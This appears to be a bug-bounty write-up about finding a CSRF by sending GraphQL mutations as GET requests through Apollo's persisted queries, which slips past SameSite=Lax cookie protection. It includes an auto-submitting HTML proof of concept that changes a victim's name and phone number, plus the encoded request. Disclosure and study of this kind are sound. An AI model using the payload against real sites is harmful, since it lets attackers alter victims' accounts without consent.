# How I Found a CSRF via a misconfiguration in graphql

- **Source URL:** https://medium.com/@ismailismailgamal52/how-i-found-a-csrf-via-a-misconfiguration-in-graphql-42676a1e12b7?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@ismailismailgamal52
- **Fetched:** 2026-11-18
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 8838)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Hi everyone,

I recently found a CSRF on a program on bugcrowd and i’d like to share the whole story so maybe you can learn something from it.

If you need a refresher on Cross-site request forgery or Graphql you can check out [**OWASP**](https://owasp.org/www-community/attacks/csrf) or [**portswigger**](https://portswigger.net/web-security/csrf) for CSRF and [**howtographql.com**](https://www.howtographql.com/basics/0-introduction/) for Graphql. I will also try to briefly explain some concepts along the way.

I started hunting on the target by looking for IDORs and CSRFs and immediately noticed the lack of CSRF tokens on all of the /graphql API’s requests, for sensitive actions like changing the email or password you had to write the old password which is a user-only-known value and acts like a kind of CSRF token.

Actions like changing the username, phone number or adding items to the user’s basket didn’t have that token though.

The only thing protecting these actions from CSRF is the fact that the only cookie needed for the graphql API requests had the samesite flag set to lax, meaning if I am able to find a lax bypass it’s a valid CSRF.

The situations in which Lax cookies can be sent cross-site must satisfy both of the following:

1. The request must be a top-level navigation. You can think of this as equivalent to when the URL shown in the URL bar changes, e.g. a user clicking on a link to go to another site.
2. The request method must be safe (e.g. GET or HEAD, but not POST).

Since all graphql requests are POST requests it seems impossible to bypass lax this way, I tried sending a GET request to the graphql API just to see what happens and it returned a link to the API docs in the response body :)

I knew nothing about graphql so i didn’t understand alot but i found something called Automatic persisted queries (APQs) and it seemed like it can send graphql queries in GET requests ! but i couldn’t immediately figure out how it works at first glance so i just went to sleep thinking i should change the program.

The next day, The idea that i could be wasting a potential vulnerability made me go back but this time i went to howtographql to learn about how graphql works so i can better understand the docs before coming back.

Basically graphql uses queries for read operations and mutations for create, update and delete operations. [APQ is a technique created by Apollo](https://www.apollographql.com/docs/apollo-server/performance/apq/) to improve GraphQL network performance. A persisted query is a query string that’s cached on the server side, along with its unique identifier (always its SHA-256 hash). Clients can send this identifier *instead of* the corresponding query string, thus reducing request sizes dramatically.

The technique is meant to be used only with queries and not mutations as queries are not state changing operations and thus not vulnerable to CSRF but mutations are.

That means if the developers allows mutations to be sent through the APQ that uses GET requests and not just queries we can bypass the cookie restrictions.

Now we can create the POC shown below to change the user’s fullName and phoneNumber to test if mutations are allowed:

\<html>

\<body>

\<form method="GET" action="https://\<THE\_TARGET\_DOMAIN>/graphql">

\<input type="hidden" name="query" value="mutation UpdateAccountSettings($input: \[SettingsFieldInput!\]!, $mobileNumberOnRegistration: Boolean! = false) {updateAccountSettings(input: $input) {error customer {fullName phoneNumber @include(if: $mobileNumberOnRegistration) \_\_typename} \_\_typename}}"/>

\<input type="hidden" name="variables" value='{"mobileNumberOnRegistration":true,"input":\[{"fieldName":"fullName","value":"YouGotHacked"},{"fieldName":"phoneNumber","value":"+2001065820333"}\]}'/>

\<input type="hidden" name="extensions" value='{"persistedQuery":{"version":1,"sha256Hash":"bc760e48134dc4a791332b547bd3822d4f0bce29e7da3caa9a0036aabb2a270d"}}'/>

\<input type="submit" value="Submit">

\</form>

\<script>document.forms\[0\].submit();\</script>

\</body>

\<html>

So how does the request look like?

https://\<THE\_TARGET\_DOMAIN>/graphql?query=mutation+UpdateAccountSettings%28%24input%3A+%5BSettingsFieldInput%21%5D%21%2C+%24mobileNumberOnRegistration%3A+Boolean%21+%3D+false%29+%7BupdateAccountSettings%28input%3A+%24input%29+%7Berror+customer+%7BfullName+phoneNumber+%40include%28if%3A+%24mobileNumberOnRegistration%29+\_\_typename%7D+\_\_typename%7D%7D&variables=%7B%22mobileNumberOnRegistration%22%3Atrue%2C%22input%22%3A%5B%7B%22fieldName%22%3A%22fullName%22%2C%22value%22%3A%22YouGotHacked%22%7D%2C%7B%22fieldName%22%3A%22phoneNumber%22%2C%22value%22%3A%22%2B2001065820333%22%7D%5D%7D&extensions=%7B%22persistedQuery%22%3A%7B%22version%22%3A1%2C%22sha256Hash%22%3A%22bc760e48134dc4a791332b547bd3822d4f0bce29e7da3caa9a0036aabb2a270d%22%7D%7D

It looks quite scary but it’s actually pretty simple! The request has three parameters:

- query: The first is the query parameter for the APQ. Which defines the graphql mutation.
The hacker can manipulate this mutation to send different requests to the API.

It looks like this and just calls the API specific function that changes the phoneNumber and fullName:

```
mutation UpdateAccountSettings($input: [SettingsFieldInput!]!, $mobileNumberOnRegistration: Boolean! = false) {
    updateAccountSettings(input: $input) {
      error
      customer {
        fullName
        phoneNumber @include(if: $mobileNumberOnRegistration)
        __typename
      }
      __typename
    }
  }
```
- variables: The second is the variables parameter used in the mutation in json format (The new username and mobile number).
This could be changed to provide any necessary variables for the API request.

This part looks like this:

```
{
  "mobileNumberOnRegistration": true,
  "input": [
    {
      "fieldName": "fullName",
      "value": "YouGotHacked"
    },
    {
      "fieldName": "phoneNumber",
      "value": "+2001065820333"
    }
  ]
}
```
- extensions: The last is the hash of the mutation part also in JSON format.
For the request to be successful the hash needs to be a valid sha256 hash of the mutation part.
In this poc the hash bc760e48134dc4a791332b547bd3822d4f0bce29e7da3caa9a0036aabb2a270d is the sha256 of the value in the first input field (The mutation).

And finally this part looks like this:

```
{
  "persistedQuery": {
    "version": 1,
    "sha256Hash": "bc760e48134dc4a791332b547bd3822d4f0bce29e7da3caa9a0036aabb2a270d"
  }
}
```
In a similar way an attacker can construct any other graphql mutation in the same format and then hash the query part to provide a valid persistedQuery hash and any variables can be provided to the mutation.

Effectively we’ve found a way to make any request to the API that is not protected by a CSRF token!

### Takeaways

- Be persistent. Don’t just lose hope because you didn’t understand something or because it felt a little overwhelming.
- One mistake i made is reporting the bug without trying to find a way to increase the severity first like finding a more sensitive action to make.

Thank you for reading.
